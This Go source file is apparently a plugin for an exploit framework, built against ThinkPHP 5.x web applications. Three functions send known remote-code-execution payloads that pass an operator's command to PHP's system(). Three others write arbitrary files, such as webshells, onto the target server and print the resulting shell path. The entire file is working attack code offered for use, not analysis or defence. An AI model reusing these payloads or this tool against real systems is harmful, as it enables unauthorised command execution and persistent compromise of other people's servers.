package exp_ThinkPHP

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strconv"
	"strings"
)

type Exp_ThinkPHP_5_x struct {
	exp_templates.ExpTemplate
}

func (self *Exp_ThinkPHP_5_x) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 构造payload
	headers := self.GetInitExpHeaders()

	shellPayload := "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload + self.MustGetStringParam("cmd")

	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func (self *Exp_ThinkPHP_5_x) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=%s&vars[1][1]=%s`

	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + fmt.Sprintf(shellPayload, filename, url.PathEscape(content))
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	keyword := ""
	if len(httpresp.Body) > 20 {
		keyword = httpresp.Body[:4]
	} else {
		keyword = httpresp.Body
	}
	if httpresp.Resp.StatusCode == 200 && strings.HasSuffix(keyword, strconv.Itoa(len(content))) {
		expResult.Status = true
		tmpSlice := strings.Split(self.Params.BaseParam.Target, "/")
		self.EchoSuccessMsg("shell路径: %s", strings.TrimSuffix(self.Params.BaseParam.Target, tmpSlice[len(tmpSlice)-1])+filename)
	}

	return
}

func (self *Exp_ThinkPHP_5_x) Attack_cmd2() (expResult exp_model.ExpResult) {
	// 构造payload
	headers := self.GetInitExpHeaders()

	shellPayload := "?s=index/\\think\\Request/input&filter=system&data="
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload + self.MustGetStringParam("cmd")

	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return

}

func (self *Exp_ThinkPHP_5_x) Attack_upload2() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `?s=index/\think\template\driver\File/write&cacheFile=%s&content=%s`
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + fmt.Sprintf(shellPayload, filename, url.PathEscape(content))
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if httpresp.Resp.StatusCode == 200 && httpresp.Body == "" {
		expResult.Status = true
		tmpSlice := strings.Split(self.Params.BaseParam.Target, "/")
		self.EchoSuccessMsg("请人工校验是否成功，shell路径: %s", strings.TrimSuffix(self.Params.BaseParam.Target, tmpSlice[len(tmpSlice)-1])+filename)

	}

	return
}

func (self *Exp_ThinkPHP_5_x) Attack_cmd3() (expResult exp_model.ExpResult) {
	// 构造payload
	headers := self.GetInitExpHeaders()

	shellPayload := "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload + self.MustGetStringParam("cmd")

	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return

}

func (self *Exp_ThinkPHP_5_x) Attack_upload3() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=%s&vars[1][1]=%s`
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + fmt.Sprintf(shellPayload, filename, url.PathEscape(content))
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	keyword := ""
	if len(httpresp.Body) > 20 {
		keyword = httpresp.Body[:4]
	} else {
		keyword = httpresp.Body
	}
	if httpresp.Resp.StatusCode == 200 && strings.HasSuffix(keyword, strconv.Itoa(len(content))) {
		expResult.Status = true
		tmpSlice := strings.Split(self.Params.BaseParam.Target, "/")
		self.EchoSuccessMsg("shell路径: %s", strings.TrimSuffix(self.Params.BaseParam.Target, tmpSlice[len(tmpSlice)-1])+filename)

	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_ThinkPHP_5_x{}, "exp_ThinkPHP_5_x.yml")
}
